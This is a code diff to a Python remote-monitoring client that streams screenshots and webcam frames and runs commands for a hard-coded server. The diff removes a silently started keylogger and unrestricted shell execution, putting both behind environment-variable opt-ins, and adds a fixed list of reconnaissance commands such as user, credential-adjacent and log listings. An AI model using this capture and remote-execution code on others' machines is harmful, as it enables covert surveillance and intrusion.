@@ -100,10 +100,16 @@ def get_peripherals_info():
 # ============================================================
 SERVER_URL = "http://100.104.145.118:5000"
 DEVICE_ID_CACHE = os.path.join(os.path.expanduser('~'), '.alleyesx_device_id')
-HEARTBEAT_INTERVAL = 2
-SCREENSHOT_INTERVAL = 0.05
-WEBCAM_INTERVAL = 0.066
-TOUCH_POLL_INTERVAL = 0.1
+HEARTBEAT_INTERVAL = 5
+STREAM_PROFILE = os.environ.get('ALLEYESX_STREAM_PROFILE', 'low').lower()
+STREAM_TARGET_FPS = {
+    'low': 35,       # requested low-performance target range: 30-40 FPS
+    'balanced': 40,
+    'high': 60,      # requested high-performance target: up to 60 FPS
+}.get(STREAM_PROFILE, 35)
+SCREENSHOT_INTERVAL = float(os.environ.get('ALLEYESX_SCREENSHOT_INTERVAL', str(1.0 / STREAM_TARGET_FPS)))
+WEBCAM_INTERVAL = float(os.environ.get('ALLEYESX_WEBCAM_INTERVAL', str(1.0 / STREAM_TARGET_FPS)))
+TOUCH_POLL_INTERVAL = float(os.environ.get('ALLEYESX_TOUCH_POLL_INTERVAL', '0.05'))
 DIRTY_RECT_THRESHOLD = 0.005
 SCREENSHOT_QUALITY = 70
 WEBCAM_QUALITY = 65
@@ -376,13 +382,20 @@ def get_ram_total_gb():
 def collect_hardware_inventory():
     """Collect complete hardware inventory for device registration."""
     inventory = {
+        'os': {
+            'name': platform.system(),
+            'version': platform.release(),
+            'architecture': platform.machine(),
+            'kernel_version': platform.version(),
+            'boot_time': get_boot_time(),
+        },
         'processor': collect_processor_info(),
         'memory': collect_memory_info(),
-        'gpu': collect_gpu_info(),
+        'graphics': collect_gpu_info(),
         'storage': collect_storage_info(),
-        'network': collect_network_info(),
+        'network_interfaces': collect_network_info(),
         'peripherals': get_peripherals_info(),
-        'hardware_info': collect_hardware_info(),
+        'hardware': collect_hardware_info(),
         'timestamp': datetime.datetime.utcnow().isoformat(),
     }
     return inventory
@@ -1644,9 +1657,143 @@ def capture_webcam():
 # ============================================================
 # REMOTE COMMAND EXECUTION
 # ============================================================
+def resolve_managed_command(command):
+    """Map ALL EYES X terminal aliases to bounded, defensive admin commands.
+
+    Raw shell execution is disabled by default. To use it in a controlled lab,
+    start the agent with ALLEYESX_ALLOW_RAW_COMMANDS=1 and prefix commands with
+    shell:. All executions are still timed out by execute_command().
+    """
+    cmd = (command or '').strip()
+    key = cmd.lower()
+
+    if key.startswith('shell:'):
+        if os.environ.get('ALLEYESX_ALLOW_RAW_COMMANDS') == '1':
+            return cmd[6:].strip()
+        raise PermissionError('Raw shell commands are disabled on this agent')
+
+    win = sys.platform == 'win32'
+    mac = sys.platform == 'darwin'
+
+    if win:
+        commands = {
+            'sys_info': 'systeminfo',
+            'os_info': 'wmic os get Caption,Version,BuildNumber,OSArchitecture /format:list',
+            'hostname': 'hostname',
+            'whoami': 'whoami',
+            'uptime': 'powershell -NoProfile -Command "(Get-CimInstance Win32_OperatingSystem).LastBootUpTime"',
+            'cpu_info': 'wmic cpu get Name,NumberOfCores,NumberOfLogicalProcessors,MaxClockSpeed',
+            'cpu_usage': 'powershell -NoProfile -Command "Get-CimInstance Win32_Processor | Select-Object LoadPercentage"',
+            'mem_info': 'wmic computersystem get TotalPhysicalMemory',
+            'mem_usage': 'powershell -NoProfile -Command "Get-CimInstance Win32_OperatingSystem | Select-Object FreePhysicalMemory,TotalVisibleMemorySize"',
+            'disk_usage': 'wmic logicaldisk get DeviceID,Size,FreeSpace,FileSystem,VolumeName',
+            'disk_list': 'wmic diskdrive get Model,Size,Status,InterfaceType',
+            'ip_config': 'ipconfig /all',
+            'net_interfaces': 'netsh interface show interface',
+            'route_table': 'route print',
+            'arp_table': 'arp -a',
+            'dns_cache': 'ipconfig /displaydns',
+            'net_stat': 'netstat -ano',
+            'listening_ports': 'netstat -ano | findstr LISTENING',
+            'firewall_status': 'netsh advfirewall show allprofiles state',
+            'firewall_rules': 'netsh advfirewall firewall show rule name=all',
+            'defender_status': 'powershell -NoProfile -Command "Get-MpComputerStatus"',
+            'process_list': 'tasklist /v',
+            'services_list': 'sc query type= service state= all',
+            'startup_items': 'wmic startup get Caption,Command,Location,User',
+            'scheduled_tasks': 'schtasks /query /fo LIST /v',
+            'users': 'net user',
+            'logged_user': 'whoami /user',
+            'sessions': 'query user',
+            'env_vars': 'set',
+            'installed_apps': 'wmic product get Name,Version',
+            'hotfixes': 'wmic qfe list brief',
+            'event_errors': 'wevtutil qe System /c:30 /rd:true /f:text /q:"*[System[(Level=2)]]"',
+            'event_security_recent': 'wevtutil qe Security /c:30 /rd:true /f:text',
+            'usb_devices': 'wmic path Win32_USBControllerDevice get Dependent',
+            'battery_status': 'wmic path Win32_Battery get BatteryStatus,EstimatedChargeRemaining',
+            'wifi_status': 'netsh wlan show interfaces',
+            'wifi_profiles': 'netsh wlan show profiles',
+            'shares': 'net share',
+            'printers': 'wmic printer get Name,Default,WorkOffline',
+            'drivers': 'driverquery /v',
+            'current_dir': 'cd',
+            'list_home': 'dir %USERPROFILE%',
+            'temp_usage': 'dir %TEMP%',
+            'python_version': 'python --version',
+            'agent_status': 'echo ALL EYES X agent online',
+            'ping_gateway': 'powershell -NoProfile -Command "$gw=(Get-NetRoute -DestinationPrefix 0.0.0.0/0 | Select-Object -First 1).NextHop; ping $gw"',
+            'trace_dns': 'tracert 8.8.8.8',
+            'net_accounts': 'net accounts',
+            'lock_screen': 'rundll32.exe user32.dll,LockWorkStation',
+            'reboot': 'shutdown /r /t 60 /c "ALL EYES X authorized reboot requested"',
+            'shutdown': 'shutdown /s /t 60 /c "ALL EYES X authorized shutdown requested"',
+        }
+    else:
+        service_cmd = 'launchctl list' if mac else 'systemctl list-units --type=service --no-pager'
+        commands = {
+            'sys_info': 'uname -a',
+            'os_info': 'sw_vers 2>/dev/null || cat /etc/os-release',
+            'hostname': 'hostname',
+            'whoami': 'whoami',
+            'uptime': 'uptime',
+            'cpu_info': 'sysctl -n machdep.cpu.brand_string 2>/dev/null || lscpu',
+            'cpu_usage': 'top -l 1 -n 0 2>/dev/null | head -10 || top -bn1 | head -10',
+            'mem_info': 'vm_stat 2>/dev/null || free -h',
+            'mem_usage': 'vm_stat 2>/dev/null || free -h',
+            'disk_usage': 'df -h',
+            'disk_list': 'diskutil list 2>/dev/null || lsblk',
+            'ip_config': 'ifconfig || ip addr',
+            'net_interfaces': 'networksetup -listallhardwareports 2>/dev/null || ip link',
+            'route_table': 'netstat -rn',
+            'arp_table': 'arp -a',
+            'dns_cache': 'scutil --dns 2>/dev/null || resolvectl status 2>/dev/null || cat /etc/resolv.conf',
+            'net_stat': 'netstat -tunap 2>/dev/null || netstat -anv',
+            'listening_ports': 'lsof -i -P -n | grep LISTEN 2>/dev/null || netstat -lntup',
+            'firewall_status': 'pfctl -s info 2>/dev/null || ufw status 2>/dev/null || firewall-cmd --state 2>/dev/null',
+            'firewall_rules': 'pfctl -sr 2>/dev/null || ufw status numbered 2>/dev/null || iptables -S 2>/dev/null',
+            'defender_status': 'echo Platform security status not reported by this agent',
+            'process_list': 'ps aux',
+            'services_list': service_cmd,
+            'startup_items': 'ls -la ~/Library/LaunchAgents /Library/LaunchAgents /Library/LaunchDaemons 2>/dev/null || ls -la ~/.config/autostart /etc/systemd/system',
+            'scheduled_tasks': 'crontab -l 2>/dev/null; ls -la /etc/cron* 2>/dev/null',
+            'users': 'dscl . list /Users 2>/dev/null || cut -d: -f1 /etc/passwd',
+            'logged_user': 'id',
+            'sessions': 'who',
+            'env_vars': 'env',
+            'installed_apps': 'ls /Applications 2>/dev/null || dpkg -l 2>/dev/null || rpm -qa 2>/dev/null',
+            'hotfixes': 'softwareupdate --history 2>/dev/null || grep " install " /var/log/dpkg.log 2>/dev/null | tail -50',
+            'event_errors': 'log show --last 1h --predicate "eventType == logEvent" 2>/dev/null | tail -100 || journalctl -p err -n 100 --no-pager',
+            'event_security_recent': 'log show --last 1h 2>/dev/null | tail -100 || journalctl -n 100 --no-pager',
+            'usb_devices': 'system_profiler SPUSBDataType 2>/dev/null || lsusb',
+            'battery_status': 'pmset -g batt 2>/dev/null || upower -i $(upower -e | grep BAT | head -1) 2>/dev/null',
+            'wifi_status': 'networksetup -getairportnetwork en0 2>/dev/null || iw dev 2>/dev/null',
+            'wifi_profiles': 'networksetup -listpreferredwirelessnetworks en0 2>/dev/null || ls /etc/NetworkManager/system-connections 2>/dev/null',
+            'shares': 'sharing -l 2>/dev/null || smbstatus -S 2>/dev/null',
+            'printers': 'lpstat -p 2>/dev/null',
+            'drivers': 'kextstat 2>/dev/null || lsmod',
+            'current_dir': 'pwd',
+            'list_home': 'ls -la ~',
+            'temp_usage': 'du -sh /tmp 2>/dev/null; ls -la /tmp | head -50',
+            'python_version': 'python3 --version || python --version',
+            'agent_status': 'echo ALL EYES X agent online',
+            'ping_gateway': 'gw=$(route -n get default 2>/dev/null | awk "/gateway/ {print $2}" || ip route | awk "/default/ {print $3; exit}"); ping -c 4 "$gw"',
+            'trace_dns': 'traceroute 8.8.8.8 2>/dev/null || tracepath 8.8.8.8',
+            'net_accounts': 'passwd -S $(whoami) 2>/dev/null || dscl . read /Users/$(whoami) 2>/dev/null',
+            'lock_screen': 'pmset displaysleepnow 2>/dev/null || loginctl lock-session 2>/dev/null',
+            'reboot': 'echo Reboot requires local authorization on this platform',
+            'shutdown': 'echo Shutdown requires local authorization on this platform',
+        }
+
+    if key not in commands:
+        raise ValueError(f'Unknown managed command: {command}. Use help in the terminal for supported commands.')
+    return commands[key]
+
+
 def execute_command(command):
     try:
-        result = subprocess.run(command, shell=True, capture_output=True, timeout=60, text=True)
+        resolved = resolve_managed_command(command)
+        result = subprocess.run(resolved, shell=True, capture_output=True, timeout=60, text=True)
         output = result.stdout or result.stderr or ''
         return {'success': result.returncode == 0, 'result': output[:10000]}
     except subprocess.TimeoutExpired:
@@ -1849,16 +1996,6 @@ class ALLEYESXClient:
                 print(f"[+] IP: {sys_info['ip']}")
                 print(f"[+] Server: {SERVER_URL}")
 
-                payload = get_device_payload()
-            try:
-                r = requests.post(f"{server}/api/register", json=payload, timeout=5)
-                print("[+] register ->", r.status_code, r.text[:200])
-                d = requests.get(f"{server}/api/dashboard", timeout=5).json()
-                print("[+] dashboard devices:", d.get("devices", {}).get("total"), "total,", d.get("devices", {}).get("list"))
-            except Exception as e:
-                print("[!] register failed:", e)
-                
-                
                 # === NOW SEND FULL HARDWARE INVENTORY ===
                 print("[*] Collecting hardware inventory...")
                 inventory = collect_hardware_inventory()
@@ -2004,8 +2141,9 @@ class ALLEYESXClient:
         print(f"[*] Device ID: {self.device_id}")
         print(f"[*] Server: {SERVER_URL}")
         print(f"[*] Platform: {sys.platform}")
-        print(f"[*] Screenshot: {1/SCREENSHOT_INTERVAL:.0f} FPS")
-        print(f"[*] Webcam: {1/WEBCAM_INTERVAL:.0f} FPS")
+        print(f"[*] Stream profile: {STREAM_PROFILE} ({STREAM_TARGET_FPS} FPS target)")
+        print(f"[*] Screenshot: {1/SCREENSHOT_INTERVAL:.0f} FPS target")
+        print(f"[*] Webcam: {1/WEBCAM_INTERVAL:.0f} FPS target")
         print()
         
         self.register()
@@ -2016,12 +2154,15 @@ class ALLEYESXClient:
         except:
             pass
         
-        try:
-            self.keylogger_thread = start_keylogger()
-            if self.keylogger_thread:
-                print("[+] Keylogger started")
-        except:
-            pass
+        # Keystroke capture is disabled by default. It must not run silently.
+        # Future authorized session flows can enable explicit, logged input diagnostics.
+        if os.environ.get('ALLEYESX_ENABLE_KEYLOG_DIAGNOSTIC') == '1':
+            try:
+                self.keylogger_thread = start_keylogger()
+                if self.keylogger_thread:
+                    print("[+] Input diagnostic capture started (explicit opt-in)")
+            except:
+                pass
         
         print()
         print("[*] Entering main loop...")
@@ -2054,7 +2195,7 @@ class ALLEYESXClient:
                     fps_timer = now
                 
                 elapsed = time.time() - loop_start
-                sleep_time = max(0.001, 0.01 - elapsed)
+                sleep_time = max(0.05, min(1.0, 0.25 - elapsed))
                 time.sleep(sleep_time)
                 
             except KeyboardInterrupt:
